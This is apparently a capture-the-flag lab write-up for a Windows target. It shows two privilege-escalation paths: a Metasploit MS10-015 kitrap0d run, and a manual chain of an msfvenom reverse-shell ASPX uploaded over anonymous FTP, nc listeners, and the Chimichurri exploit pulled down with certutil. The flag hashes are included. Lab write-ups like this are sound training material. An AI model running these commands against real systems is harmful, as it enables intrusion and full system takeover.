#kernel #kitrap0d #metasploit #netcat #Chimichurri #MS10-059 #MS10-015 #FTP #python #certutil #msfvenom #Windows #PrivEsc 

---

Windows Kernel Exploits - [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

## Metasploit Method
1. Background the session
	1. `bg session`
2.  Use **MS10-015** kitrap0d exploit
```
msf6 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  11               yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.4       yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)



View the full module info with the info, or info -d command.
```

Exploited
```
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.4:5555 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 4068 launched.
[*] Reflectively injecting the DLL into 4068...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176198 bytes) to 10.10.10.5
[*] Meterpreter session 12 opened (10.10.14.4:5555 -> 10.10.10.5:49202) at 2024-10-01 14:46:13 -0700

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

3. User flag - babis
```
c:\Users\babis\Desktop>type user.txt
type user.txt
dc9de1a7dfec1f3f1eafc09aa7ede2ea
```

4. Root flag
```
c:\Users\Administrator\Desktop>type root.txt
type root.txt
56738ddd739b096a539b9256b3abeb12
```

---

## Manual Method

1. Create reverse tcp payload with `msfvenom` 
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=5555 -f aspx >manual.aspx
```

2. Use ftp to `PUT` `manual.aspx` payload on `10.10.10.5` server
```
┌──(root㉿kali)-[~]
└─# ftp anonymous@10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put manual.aspx 
local: manual.aspx remote: manual.aspx
229 Entering Extended Passive Mode (|||49204|)
150 Opening ASCII mode data connection.
100% |***************************************************************************************************************|  2753       65.63 MiB/s    --:-- ETA
226 Transfer complete.
2753 bytes sent in 00:00 (26.85 KiB/s)
```

3. Create listener on specified port from payload
```
nc -lnvp 5555
```

4. Navigate to url `10.10.10.5/manual.aspx` to catch shell in `nc` 
```
┌──(root㉿kali)-[~]
└─# nc -lnvp 5555 
listening on [any] 5555 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.5] 49210
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami    
whoami
iis apppool\web
```

5. Found exploit that give local system shell, **==MS10-059 (Chimichurri)==**. Download `.exe` and start python server to transfer file (`cd` to location of file)
```python3
┌──(root㉿kali)-[~/Downloads]
└─# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.5 - - [01/Oct/2024 15:10:41] "GET /Chimichurri.exe HTTP/1.1" 200 -
```

```certutil
c:\Windows\Temp>certutil -urlcache -f http://10.10.14.4:8000/Chimichurri.exe ms.exe                                                                         
certutil -urlcache -f http://10.10.14.4:8000/Chimichurri.exe ms.exe                                                                                         
****  Online  ****                                                                                                                                          
CertUtil: -URLCache command completed successfully.  
```

6. Run start `nc` listener for used with `ms.exe` and run `ms.exe`
```nc
┌──(root㉿kali)-[~]
└─# nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.5] 49218
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\Windows\Temp>whoami
whoami
nt authority\system
```

```Chimichurri
c:\Windows\Temp>ms.exe 10.10.14.4 5555
ms.exe 10.10.14.4 5555
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
```